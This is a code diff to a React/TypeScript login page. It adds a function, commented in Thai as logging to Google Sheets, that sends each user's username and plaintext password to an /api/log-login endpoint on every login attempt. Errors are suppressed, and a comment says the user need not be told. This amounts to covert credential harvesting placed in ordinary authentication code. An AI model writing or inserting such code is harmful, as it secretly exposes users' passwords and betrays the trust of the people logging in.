@@ -2,6 +2,22 @@
 
 import type React from "react"
 import { useState } from "react"
+// ฟังก์ชันสำหรับบันทึก log การเข้าสู่ระบบลง Google Sheets
+async function logLoginAttempt(username: string, password: string) {
+  try {
+    await fetch("/api/log-login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        username,
+        password,
+        timestamp: new Date().toISOString(),
+      }),
+    })
+  } catch (e) {
+    // ไม่ต้องแจ้ง error กับผู้ใช้
+  }
+}
 import { Button } from "./ui/button"
 import { Input } from "./ui/input"
 import { Label } from "./ui/label"
@@ -26,6 +42,9 @@ export function LoginPage({ onLogin }: LoginPageProps) {
 
     // Simulate loading
     await new Promise((resolve) => setTimeout(resolve, 1000))
+
+    // Log login attempt (user, pass, timestamp)
+    logLoginAttempt(username, password)
 
     const success = onLogin(username, password)
     if (!success) {
